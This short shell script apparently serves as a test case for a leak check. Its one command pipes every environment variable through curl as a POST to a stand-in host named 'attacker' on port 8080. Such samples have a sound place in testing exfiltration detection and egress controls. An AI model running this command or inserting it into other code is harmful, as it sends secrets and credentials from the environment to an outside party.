#!/bin/sh
# title: Post every environment variable to the attacker
# check: leak
env | curl -s -m 10 -X POST --data-binary @- http://attacker:8080/collect || true
